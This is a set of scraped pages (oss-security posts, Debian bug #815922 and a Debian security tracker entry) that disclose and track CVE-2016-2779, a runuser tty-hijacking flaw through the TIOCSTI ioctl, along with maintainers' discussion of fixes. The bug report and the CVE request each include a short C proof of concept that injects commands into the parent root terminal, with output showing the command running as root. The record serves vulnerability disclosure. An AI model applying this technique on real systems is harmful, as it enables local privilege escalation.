=== Content from www.openwall.com_0b761aac_20250125_234907.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](1) [[thread-next>]](../../../2016/02/28/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20160227134425.4F5F26C012D@smtpvmsrv1.mitre.org>
Date: Sat, 27 Feb 2016 08:44:25 -0500 (EST)
From: cve-assign@...re.org
To: up201407890@...nos.dcc.fc.up.pt
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> When executing a program via "runuser -u nonpriv program" the
> nonpriv session can
> escape to the parent session by using the TIOCSTI ioctl to push
> characters into the
> terminal's input buffer

> <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=815922>

Use CVE-2016-2779.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJW0aedAAoJEL54rhJi8gl5pAoQAKWMwUdm+ZVBG7mMq8qqlCSQ
an4Xqnp7s8vlogDY3NDBvVYazYVtg5Ajh9fSrWtNJeRcRkfiOw856XYNyN3mXcvn
JXD2XMllsy+UsynMKzt4rlp6qlUCa26s4q60q6eDhoZRkRu/YjpitlnJwB6o2+yJ
J8rZ3gZgzBL9ydfn0e+dOTdHrrpkM6mnKl1i6XKiHAdCz9AXqEn+rWVpsp6tfg8p
Xnjr7VYQYBqELHzX4w7wuyMsc1zSSFd4X2dqT50ypNbRVh+UjZLR5bO4NNIILFB4
YJGuGIKKc6rkGgNrNa7CM7Ll0f2O+i1Bpb4Iv+39ACT5TRXuFGwh2O//ZRCeLVbl
edEhEnc60xcJAGnf47bA11thDvgxS11sc/tI++2bW3jYARRzybSS6Ym0hvGP/lGE
8VycZrUMMDKKTXWu7mXxqTnbIDh91y1jVpdfZ077Qf9maEzpTM89zXuMc2GTbylY
on8ZoRqxNto++aejWpILRvno9iA7jxXj68ex4Lb8IFNJeQNoKYaZRs/OxM62RmUV
GAK/HrGbhM/A2/6AvFbrYEdXIbEzbFJqbLuZ0p/+sQZzQuoD9p992Cm2+yjPkoC0
CJOzwgm9GSPYzvLmIOGWw/7n+H+a2HRGxKzscwc6GP2fmSfYdyfcCS76fcKlx30N
uTHZfWSO+IA9Kz9tUgc2
=L3QX
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_93825542_20250125_234907.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2016/02/26/6) [[next>]](2) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20160226155416.82785yodpagwmigw@webmail.alunos.dcc.fc.up.pt>
Date: Fri, 26 Feb 2016 15:54:16 +0100
From: up201407890@...nos.dcc.fc.up.pt
To: oss-security@...ts.openwall.com
Cc: cve-assign@...re.org
Subject: CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl

This is a similar issue to the one I posted yesterday on oss-sec, but
to runuser(1) from util-linux, which can only be run as root for the
purpose of executing programs as another user.

<https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=815922>

When executing a program via "runuser -u nonpriv program" the
nonpriv session can
escape to the parent session by using the TIOCSTI ioctl to push
characters into the
terminal's input buffer, allowing privilege escalation.
This issue has been fixed in "su" by calling setsid() and in "sudo" by
using the "use_pty" flag

# cat test.c
#include <sys/ioctl.h>

int main()
{
char *cmd = "id\n";
while(*cmd)
ioctl(0, TIOCSTI, cmd++);
}

# gcc test.c -o test
# id saken
uid=1000(saken) gid=1000(saken) groups=1000(saken)

# runuser -u saken ./test ---> last command i type in
id
# id ---> did not type this
uid=0(root) gid=0(root) groups=0(root)

I'd like to request a CVE for this issue.

Thanks,
Federico Bento

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.debian.org_787fa8a3_20250126_125402.html ===

# Debian Bug report logs - #815922 util-linux: CVE-2016-2779: runuser tty hijacking via TIOCSTI ioctl

[![version graph](version.cgi?width=2;package=util-linux;collapse=1;absolute=0;found=util-linux%2F2.24.2-1;height=2;fixed=2.31.1-0.1)](version.cgi?info=1;fixed=2.31.1-0.1;package=util-linux;absolute=0;found=util-linux%2F2.24.2-1;collapse=1)

Package:
[util-linux](pkgreport.cgi?package=util-linux);
Maintainer for [util-linux](pkgreport.cgi?package=util-linux) is [util-linux packagers <util-linux@packages.debian.org>](pkgreport.cgi?maint=util-linux%40packages.debian.org); Source for [util-linux](pkgreport.cgi?package=util-linux) is [src:util-linux](pkgreport.cgi?src=util-linux) ([PTS](https://tracker.debian.org/pkg/util-linux), [buildd](https://buildd.debian.org/util-linux), [popcon](https://qa.debian.org/popcon.php?package=util-linux)).

Reported by: [up201407890@alunos.dcc.fc.up.pt](pkgreport.cgi?submitter=up201407890%40alunos.dcc.fc.up.pt)

Date: Thu, 25 Feb 2016 18:54:02 UTC

Severity: important

Tags: security, upstream

Found in version util-linux/2.24.2-1

Fixed in version 2.31.1-0.1

**Done:** Chris Hofstaedtler <zeha@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=815922;mbox=yes), [status mbox](bugreport.cgi?bug=815922;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=815922;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Thu, 25 Feb 2016 18:54:06 GMT) ([full text](bugreport.cgi?bug=815922;msg=2), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

New Bug report received and forwarded. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Thu, 25 Feb 2016 18:54:06 GMT) ([full text](bugreport.cgi?bug=815922;msg=4), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=5), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: submit@bugs.debian.org
Subject: runuser tty hijacking via TIOCSTI ioctl
Date: Thu, 25 Feb 2016 19:51:23 +0100
```
Package: util-linux
Version: all
Severity: important

When executing a program via "runuser -u nonpriv program" the
nonpriv session can
escape to the parent session by using the TIOCSTI ioctl to push
characters into the
terminal's input buffer, allowing privilege escalation.
This issue has been fixed in "su" by calling setsid() and in "sudo" by
using the "use_pty" flag

# cat test.c
#include <sys/ioctl.h>

int main()
{
  char *cmd = "id\n";
  while(*cmd)
   ioctl(0, TIOCSTI, cmd++);
}

# gcc test.c -o test
# id saken
uid=1000(saken) gid=1000(saken) groups=1000(saken)

# runuser -u saken ./test ---> last command i type in
id
# id ---> did not type this
uid=0(root) gid=0(root) groups=0(root)

Thanks,
Federico Bento

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Fri, 26 Feb 2016 15:18:17 GMT) ([full text](bugreport.cgi?bug=815922;msg=7), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Phil Susi <psusi@ubuntu.com>`:

Extra info received and forwarded to list. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Fri, 26 Feb 2016 15:18:17 GMT) ([full text](bugreport.cgi?bug=815922;msg=9), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 815922@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=10), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=psusi%40ubuntu.com)
From: Phil Susi <psusi@ubuntu.com>
To: up201407890@alunos.dcc.fc.up.pt, 815922@bugs.debian.org
Subject: Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl
Date: Fri, 26 Feb 2016 10:04:49 -0500
```
On 2/25/2016 1:51 PM, up201407890@alunos.dcc.fc.up.pt wrote:
> When executing a program via "runuser -u nonpriv program" the
> nonpriv session can
> escape to the parent session by using the TIOCSTI ioctl to push
> characters into the
> terminal's input buffer, allowing privilege escalation.
> This issue has been fixed in "su" by calling setsid() and in "sudo" by
> using the "use_pty" flag

How does setsid() help this?  And wouldn't it break the ability to use
ctrl-c and ctrl-z on the child program ( since the child won't have a
controlling terminal )?  I would think the fix would be to simply flush
the terminal input buffer after the child exits.

```

---

**No longer marked as found in versions all.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sat, 27 Feb 2016 06:51:09 GMT) ([full text](bugreport.cgi?bug=815922;msg=12), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=12), [link](#11)).

---

**Added tag(s) security.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sat, 27 Feb 2016 06:51:14 GMT) ([full text](bugreport.cgi?bug=815922;msg=14), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=14), [link](#13)).

---

**Marked as found in versions util-linux/2.24.2-1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sat, 27 Feb 2016 07:03:03 GMT) ([full text](bugreport.cgi?bug=815922;msg=16), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=16), [link](#15)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Sat, 27 Feb 2016 09:57:03 GMT) ([full text](bugreport.cgi?bug=815922;msg=18), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=18), [link](#17)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Sat, 27 Feb 2016 09:57:03 GMT) ([full text](bugreport.cgi?bug=815922;msg=20), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=20), [link](#19)).

---

[Message #21](#21) received at 815922@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=21), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=21), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: "Phil Susi" <psusi@ubuntu.com>
Cc: 815922@bugs.debian.org
Subject: Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl
Date: Sat, 27 Feb 2016 10:23:37 +0100
```
Quoting "Phil Susi" <psusi@ubuntu.com>:

> How does setsid() help this?  And wouldn't it break the ability to use
> ctrl-c and ctrl-z on the child program ( since the child won't have a
> controlling terminal )?  I would think the fix would be to simply flush
> the terminal input buffer after the child exits.
>

Hello Phil,

Most of your questions are answered here:
<https://bugzilla.redhat.com/show_bug.cgi?id=173008>

And yes, there would be no job control if you started a shell from
there. This is why in "su" setsid() is called only with "-c",
partially fixing the issue. If one would to "su - user" it would still
be vulnerable.

<http://www.openwall.com/lists/oss-security/2016/02/25/6>

The same pkexec issue got assigned [CVE-2016-2568](https://security-tracker.debian.org/tracker/CVE-2016-2568) yesterday, if you
read my PS: "I don't believe any of the previous mentions of fixes for
"su" and
"sudo" would work here, since executing a shell via pkexec would make it not
have job control."

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Added tag(s) upstream.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sat, 27 Feb 2016 16:18:13 GMT) ([full text](bugreport.cgi?bug=815922;msg=23), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=23), [link](#22)).

---

**Changed Bug title to 'util-linux: CVE-2016-2779: runuser tty hijacking via TIOCSTI ioctl' from 'runuser tty hijacking via TIOCSTI ioctl'**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sat, 27 Feb 2016 16:18:14 GMT) ([full text](bugreport.cgi?bug=815922;msg=25), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=25), [link](#24)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Mon, 29 Feb 2016 14:51:14 GMT) ([full text](bugreport.cgi?bug=815922;msg=27), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent**
to `Phil Susi <psusi@ubuntu.com>`:

Extra info received and forwarded to list. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Mon, 29 Feb 2016 14:51:14 GMT) ([full text](bugreport.cgi?bug=815922;msg=29), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 815922@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=30), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=psusi%40ubuntu.com)
From: Phil Susi <psusi@ubuntu.com>
To: up201407890@alunos.dcc.fc.up.pt
Cc: 815922@bugs.debian.org
Subject: Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl
Date: Mon, 29 Feb 2016 09:47:04 -0500
```
On 2/27/2016 4:23 AM, up201407890@alunos.dcc.fc.up.pt wrote:
> And yes, there would be no job control if you started a shell from
> there. This is why in "su" setsid() is called only with "-c", partially
> fixing the issue. If one would to "su - user" it would still be vulnerable.

That isn't good.  Shouldn't only the foreground process group be allowed
to use this ioctl, thus preventing any background forked processes from
exploiting this?

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Mon, 29 Feb 2016 18:33:07 GMT) ([full text](bugreport.cgi?bug=815922;msg=32), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Mon, 29 Feb 2016 18:33:07 GMT) ([full text](bugreport.cgi?bug=815922;msg=34), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 815922@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=35), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: "Phil Susi" <psusi@ubuntu.com>
Cc: 815922@bugs.debian.org
Subject: Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl
Date: Mon, 29 Feb 2016 19:29:50 +0100
```
Quoting "Phil Susi" <psusi@ubuntu.com>:

> On 2/27/2016 4:23 AM, up201407890@alunos.dcc.fc.up.pt wrote:
>> And yes, there would be no job control if you started a shell from
>> there. This is why in "su" setsid() is called only with "-c", partially
>> fixing the issue. If one would to "su - user" it would still be vulnerable.
>
> That isn't good.  Shouldn't only the foreground process group be allowed
> to use this ioctl, thus preventing any background forked processes from
> exploiting this?

I believe that is up to kernel developers.
grsecurity released a new feature named GRKERNSEC_HARDEN_TTY on Feb 18
that disallows the use of TIOCSTI to unprivileged users, unless they
have the CAP_SYS_ADMIN capability, mitigating these issues.

He said looking into it, he didn't find any legitimate uses of such ioctl.

Check out gr_handle_tiocsti()

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Tue, 01 Mar 2016 13:36:11 GMT) ([full text](bugreport.cgi?bug=815922;msg=37), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Phil Susi <psusi@ubuntu.com>`:

Extra info received and forwarded to list. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Tue, 01 Mar 2016 13:36:11 GMT) ([full text](bugreport.cgi?bug=815922;msg=39), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 815922@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=40), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=psusi%40ubuntu.com)
From: Phil Susi <psusi@ubuntu.com>
To: up201407890@alunos.dcc.fc.up.pt
Cc: 815922@bugs.debian.org
Subject: Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl
Date: Tue, 1 Mar 2016 08:35:07 -0500
```
On 2/29/2016 1:29 PM, up201407890@alunos.dcc.fc.up.pt wrote:
> He said looking into it, he didn't find any legitimate uses of such ioctl.

That was the other thing I was wondering about: why would such a silly
and security problematic ioctl exist in the first place?  I guess that
answers it, and removing or restricting it means we don't break job
control.  That sounds like the proper fix instead of using setsid().

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers <ah-util-linux@debian.org>`:

`Bug#815922`; Package `util-linux`.
(Thu, 03 Mar 2016 14:18:03 GMT) ([full text](bugreport.cgi?bug=815922;msg=42), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent**
to `Stanislav Brabec <sbrabec@suse.cz>`:

Extra info received and forwarded to list. Copy sent to `Debian util-linux Maintainers <ah-util-linux@debian.org>`.
(Thu, 03 Mar 2016 14:18:03 GMT) ([full text](bugreport.cgi?bug=815922;msg=44), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 815922@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=45), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=sbrabec%40suse.cz)
From: Stanislav Brabec <sbrabec@suse.cz>
To: 815922@bugs.debian.org
Subject: Re: runuser tty hijacking via TIOCSTI ioctl
Date: Thu, 3 Mar 2016 14:58:49 +0100
```
I just opened a discussion on the upstream util-linux list:
<http://marc.info/?t=145694748900001&r=1&w=2>

Discussion there proposes to fix it in the kernel:

Disallow the use of TIOCSTI to unprivileged users unless the caller has
CAP_SYS_ADMIN.

--
Best Regards / S pozdravem,

Stanislav Brabec
software developer
---------------------------------------------------------------------
SUSE LINUX, s. r. o.                         e-mail: sbrabec@suse.com
Lihovarská 1060/12                            tel: +49 911 7405384547
190 00 Praha 9                                 fax:  +420 284 084 001
Czech Republic                                    <http://www.suse.cz/>
PGP: 830B 40D5 9E05 35D8 5E27 6FA3 717C 209F A04F CD76

```

---

**Reply sent**
to `Chris Hofstaedtler <zeha@debian.org>`:

You have taken responsibility.
(Wed, 08 Aug 2018 18:51:06 GMT) ([full text](bugreport.cgi?bug=815922;msg=47), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=47), [link](#46)).

---

**Notification sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Bug acknowledged by developer.
(Wed, 08 Aug 2018 18:51:06 GMT) ([full text](bugreport.cgi?bug=815922;msg=49), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=49), [link](#48)).

---

[Message #50](#50) received at 815922-done@bugs.debian.org ([full text](bugreport.cgi?bug=815922;msg=50), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=50), reply):

![](/cgi-bin/libravatar.cgi?email=zeha%40debian.org)
From: Chris Hofstaedtler <zeha@debian.org>
To: up201407890@alunos.dcc.fc.up.pt, 815922-done@bugs.debian.org
Subject: Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl
Date: Wed, 8 Aug 2018 20:46:48 +0200
```
Version: 2.31.1-0.1

Upstream had this to say for the 2.31.0 release:

 [CVE-2016-2779](https://security-tracker.debian.org/tracker/CVE-2016-2779)

 The new experimental "su --pty" feature has been implemented to fix this issue.
 The feature is not enabled by default and the new command line option --pty is
 necessary.

 The classic way is to use setsid() to disable the ioctl TIOCSTI. Unfortunately,
 setsid() has well-defined use cases in su(1) and runuser(1) and any changes
 would introduce regressions. The setsid() also does not fix core of the problem
 that is terminal file descriptors shared between privileged and unprivileged
 sessions.

Note:

 runuser uses the su-common code, and also got the --pty flag.

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Thu, 06 Sep 2018 07:26:00 GMT) ([full text](bugreport.cgi?bug=815922;msg=52), [mbox](bugreport.cgi?bug=815922;mbox=yes;msg=52), [link](#51)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=815922).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sun Jan 26 12:54:02 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from security-tracker.debian.org_53bbe0dd_20250126_125409.html ===

# CVE-2016-2779

| **Name** | CVE-2016-2779 |
| --- | --- |
| **Description** | runuser in util-linux allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2016-2779) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-2779); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2016-2779), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-2779), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2016-2779), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2016-2779), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-2779), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-2779), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2016-2779), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2016-2779)/[CVE](https://www.suse.com/security/cve/CVE-2016-2779/), GitHub [advisories](https://github.com/advisories?query=CVE-2016-2779)/[code](https://github.com/search?type=Code&q=%22CVE-2016-2779%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2016-2779%22), [web search](https://duckduckgo.com/html?q=%22CVE-2016-2779%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [815922](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=815922) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [util-linux](/tracker/source-package/util-linux) ([PTS](https://tracker.debian.org/pkg/util-linux)) | bullseye (security), bullseye | 2.36.1-8+deb11u2 | fixed |
|  | bookworm | 2.38.1-5+deb12u3 | fixed |
|  | bookworm (security) | 2.38.1-5+deb12u1 | fixed |
|  | sid, trixie | 2.40.4-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [util-linux](/tracker/source-package/util-linux) | source | squeeze | (not affected) |  |  |  |
| [util-linux](/tracker/source-package/util-linux) | source | wheezy | (not affected) |  |  |  |
| [util-linux](/tracker/source-package/util-linux) | source | (unstable) | 2.31.1-0.1 |  |  | [815922](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=815922) |

## Notes

```
[stretch] - util-linux <no-dsa> (Minor issue)
[jessie] - util-linux <no-dsa> (Minor issue)
[wheezy] - util-linux <not-affected> (runuser[.c] not yet present)
[squeeze] - util-linux <not-affected> (runuser[.c] not yet present)
Restricting ioctl on the kernel side seems the better approach, patches have been posted to kernel-hardening list
<https://www.openwall.com/lists/oss-security/2016/02/27/1>
<https://marc.info/?l=util-linux-ng&m=145694736107128&w=2>
2.31 introduces a new --pty option to separate privileged and unprivileged
shells (not enabled by default and the cli switch is necessary).

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)


